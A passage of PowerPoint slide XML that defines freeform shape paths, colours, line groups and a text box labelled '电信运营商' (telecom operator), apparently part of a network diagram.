                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239" y="158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="240" y="157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241" y="157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="242" y="157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="244" y="157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="246" y="156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="247" y="156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="249" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="252" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="253" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="261" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="262" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="263" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="264" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265" y="145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266" y="143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="268" y="141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275" y="131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="104"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="98"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="97"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="96"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="92"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="91"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="90"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="283" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="87"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="85"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="84"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="83"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="81"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="281" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="79"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="77"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="75"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277" y="71"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276" y="69"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="67"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="65"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="272" y="63"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="61"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="269" y="60"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="268" y="59"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="268" y="58"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267" y="58"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266" y="57"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="264" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="263" y="54"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="262" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="261" y="52"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="50"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="256" y="48"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255" y="48"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="253" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="252" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="251" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="249" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248" y="43"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="247" y="42"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="246" y="42"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="243" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="242" y="40"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="241" y="40"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="240" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="236" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="235" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="234" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="233" y="36"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232" y="36"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="230" y="36"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="229" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="227" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="225" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="224" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="222" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="219" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="218" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="217" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="216" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="214" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="212" y="33"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="3333FF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98333" name="Text Box 67"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1782" y="1033"/>
              <a:ext cx="349"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lnSpc>
                  <a:spcPct val="75000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>电信</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="75000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FFFFFF"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>运营商</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98334" name="Group 68"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4961" y="1219"/>
              <a:ext cx="553" cy="1513"/>
              <a:chOff x="4926" y="1049"/>
              <a:chExt cx="553" cy="1592"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98475" name="Line 69"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5075" y="1049"/>
                <a:ext cx="377"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476" name="Line 70"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5023" y="1576"/>
                <a:ext cx="377"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477" name="Line 71"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5041" y="1800"/>
                <a:ext cx="378"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478" name="Line 72"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5088" y="2641"/>
                <a:ext cx="377"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479" name="Line 73"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="4926" y="2166"/>
                <a:ext cx="55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8335" name="Group 74"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3634" y="2418"/>
              <a:ext cx="1530" cy="642"/>
              <a:chOff x="3599" y="2310"/>
              <a:chExt cx="1530" cy="638"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98473" name="Freeform 75"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3599" y="2310"/>
                <a:ext cx="1530" cy="638"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 178604 w 1274"/>
                  <a:gd name="T1" fmla="*/ 316 h 647"/>
                  <a:gd name="T2" fmla="*/ 176026 w 1274"/>
                  <a:gd name="T3" fmla="*/ 275 h 647"/>
                  <a:gd name="T4" fmla="*/ 173208 w 1274"/>
                  <a:gd name="T5" fmla="*/ 240 h 647"/>
                  <a:gd name="T6" fmla="*/ 175461 w 1274"/>
                  <a:gd name="T7" fmla="*/ 188 h 647"/>
                  <a:gd name="T8" fmla="*/ 173851 w 1274"/>
                  <a:gd name="T9" fmla="*/ 145 h 647"/>
                  <a:gd name="T10" fmla="*/ 176342 w 1274"/>
                  <a:gd name="T11" fmla="*/ 95 h 647"/>
                  <a:gd name="T12" fmla="*/ 172670 w 1274"/>
                  <a:gd name="T13" fmla="*/ 50 h 647"/>
                  <a:gd name="T14" fmla="*/ 165006 w 1274"/>
                  <a:gd name="T15" fmla="*/ 35 h 647"/>
                  <a:gd name="T16" fmla="*/ 156377 w 1274"/>
                  <a:gd name="T17" fmla="*/ 35 h 647"/>
                  <a:gd name="T18" fmla="*/ 149012 w 1274"/>
                  <a:gd name="T19" fmla="*/ 51 h 647"/>
                  <a:gd name="T20" fmla="*/ 141459 w 1274"/>
                  <a:gd name="T21" fmla="*/ 35 h 647"/>
                  <a:gd name="T22" fmla="*/ 131342 w 1274"/>
                  <a:gd name="T23" fmla="*/ 35 h 647"/>
                  <a:gd name="T24" fmla="*/ 120654 w 1274"/>
                  <a:gd name="T25" fmla="*/ 35 h 647"/>
                  <a:gd name="T26" fmla="*/ 112163 w 1274"/>
                  <a:gd name="T27" fmla="*/ 35 h 647"/>
                  <a:gd name="T28" fmla="*/ 105199 w 1274"/>
                  <a:gd name="T29" fmla="*/ 61 h 647"/>
                  <a:gd name="T30" fmla="*/ 97806 w 1274"/>
                  <a:gd name="T31" fmla="*/ 35 h 647"/>
                  <a:gd name="T32" fmla="*/ 88592 w 1274"/>
                  <a:gd name="T33" fmla="*/ 31 h 647"/>
                  <a:gd name="T34" fmla="*/ 80775 w 1274"/>
                  <a:gd name="T35" fmla="*/ 37 h 647"/>
                  <a:gd name="T36" fmla="*/ 71274 w 1274"/>
                  <a:gd name="T37" fmla="*/ 25 h 647"/>
                  <a:gd name="T38" fmla="*/ 61853 w 1274"/>
                  <a:gd name="T39" fmla="*/ 16 h 647"/>
                  <a:gd name="T40" fmla="*/ 51738 w 1274"/>
                  <a:gd name="T41" fmla="*/ 35 h 647"/>
                  <a:gd name="T42" fmla="*/ 45117 w 1274"/>
                  <a:gd name="T43" fmla="*/ 35 h 647"/>
                  <a:gd name="T44" fmla="*/ 35710 w 1274"/>
                  <a:gd name="T45" fmla="*/ 4 h 647"/>
                  <a:gd name="T46" fmla="*/ 26297 w 1274"/>
                  <a:gd name="T47" fmla="*/ 4 h 647"/>
                  <a:gd name="T48" fmla="*/ 17427 w 1274"/>
                  <a:gd name="T49" fmla="*/ 35 h 647"/>
                  <a:gd name="T50" fmla="*/ 10644 w 1274"/>
                  <a:gd name="T51" fmla="*/ 35 h 647"/>
                  <a:gd name="T52" fmla="*/ 3318 w 1274"/>
                  <a:gd name="T53" fmla="*/ 54 h 647"/>
                  <a:gd name="T54" fmla="*/ 4837 w 1274"/>
                  <a:gd name="T55" fmla="*/ 96 h 647"/>
                  <a:gd name="T56" fmla="*/ 6181 w 1274"/>
                  <a:gd name="T57" fmla="*/ 128 h 647"/>
                  <a:gd name="T58" fmla="*/ 4837 w 1274"/>
                  <a:gd name="T59" fmla="*/ 161 h 647"/>
                  <a:gd name="T60" fmla="*/ 1343 w 1274"/>
                  <a:gd name="T61" fmla="*/ 196 h 647"/>
                  <a:gd name="T62" fmla="*/ 1 w 1274"/>
                  <a:gd name="T63" fmla="*/ 242 h 647"/>
                  <a:gd name="T64" fmla="*/ 2972 w 1274"/>
                  <a:gd name="T65" fmla="*/ 295 h 647"/>
                  <a:gd name="T66" fmla="*/ 5022 w 1274"/>
                  <a:gd name="T67" fmla="*/ 340 h 647"/>
                  <a:gd name="T68" fmla="*/ 6455 w 1274"/>
                  <a:gd name="T69" fmla="*/ 384 h 647"/>
                  <a:gd name="T70" fmla="*/ 13198 w 1274"/>
                  <a:gd name="T71" fmla="*/ 417 h 647"/>
                  <a:gd name="T72" fmla="*/ 21729 w 1274"/>
                  <a:gd name="T73" fmla="*/ 425 h 647"/>
                  <a:gd name="T74" fmla="*/ 30094 w 1274"/>
                  <a:gd name="T75" fmla="*/ 431 h 647"/>
                  <a:gd name="T76" fmla="*/ 38573 w 1274"/>
                  <a:gd name="T77" fmla="*/ 444 h 647"/>
                  <a:gd name="T78" fmla="*/ 48376 w 1274"/>
                  <a:gd name="T79" fmla="*/ 426 h 647"/>
                  <a:gd name="T80" fmla="*/ 55805 w 1274"/>
                  <a:gd name="T81" fmla="*/ 419 h 647"/>
                  <a:gd name="T82" fmla="*/ 65447 w 1274"/>
                  <a:gd name="T83" fmla="*/ 419 h 647"/>
                  <a:gd name="T84" fmla="*/ 74882 w 1274"/>
                  <a:gd name="T85" fmla="*/ 398 h 647"/>
                  <a:gd name="T86" fmla="*/ 80088 w 1274"/>
                  <a:gd name="T87" fmla="*/ 394 h 647"/>
                  <a:gd name="T88" fmla="*/ 86031 w 1274"/>
                  <a:gd name="T89" fmla="*/ 431 h 647"/>
                  <a:gd name="T90" fmla="*/ 94018 w 1274"/>
                  <a:gd name="T91" fmla="*/ 442 h 647"/>
                  <a:gd name="T92" fmla="*/ 104046 w 1274"/>
                  <a:gd name="T93" fmla="*/ 424 h 647"/>
                  <a:gd name="T94" fmla="*/ 113359 w 1274"/>
                  <a:gd name="T95" fmla="*/ 422 h 647"/>
                  <a:gd name="T96" fmla="*/ 123789 w 1274"/>
                  <a:gd name="T97" fmla="*/ 407 h 647"/>
                  <a:gd name="T98" fmla="*/ 132176 w 1274"/>
                  <a:gd name="T99" fmla="*/ 426 h 647"/>
                  <a:gd name="T100" fmla="*/ 141965 w 1274"/>
                  <a:gd name="T101" fmla="*/ 415 h 647"/>
                  <a:gd name="T102" fmla="*/ 149479 w 1274"/>
                  <a:gd name="T103" fmla="*/ 425 h 647"/>
                  <a:gd name="T104" fmla="*/ 159377 w 1274"/>
                  <a:gd name="T105" fmla="*/ 429 h 647"/>
                  <a:gd name="T106" fmla="*/ 168950 w 1274"/>
                  <a:gd name="T107" fmla="*/ 433 h 647"/>
                  <a:gd name="T108" fmla="*/ 176875 w 1274"/>
                  <a:gd name="T109" fmla="*/ 420 h 647"/>
                  <a:gd name="T110" fmla="*/ 177832 w 1274"/>
                  <a:gd name="T111" fmla="*/ 376 h 64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274"/>
                  <a:gd name="T169" fmla="*/ 0 h 647"/>
                  <a:gd name="T170" fmla="*/ 1274 w 1274"/>
                  <a:gd name="T171" fmla="*/ 647 h 64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274" h="647">
                    <a:moveTo>
                      <a:pt x="1248" y="529"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="1255" y="520"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1261" y="509"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1266" y="498"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1270" y="486"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1272" y="473"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1273" y="461"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1272" y="450"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1271" y="439"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1268" y="428"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1264" y="418"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1259" y="409"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1254" y="400"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1247" y="391"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1240" y="384"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1232" y="377"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1223" y="371"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1229" y="361"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1234" y="351"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1238" y="341"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1242" y="331"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1245" y="320"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1248" y="309"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1249" y="298"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1250" y="286"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1251" y="275"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1250" y="261"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1249" y="248"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1246" y="235"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1243" y="222"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1239" y="209"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1245" y="199"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1250" y="187"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1254" y="175"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1256" y="162"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1257" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1257" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1255" y="129"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1253" y="119"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1250" y="110"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1247" y="101"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1242" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1237" y="85"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1231" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1225" y="70"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1218" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1210" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1202" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1194" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1185" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1176" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1166" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1157" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1147" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1135" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1125" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1114" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1104" y="47"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1094" y="51"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1085" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1077" y="63"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1069" y="70"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1062" y="78"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1057" y="67"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1050" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1041" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1031" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1020" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1008" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="993" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="981" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="970" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="961" y="63"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="949" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="936" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="924" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="911" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="897" y="48"/>
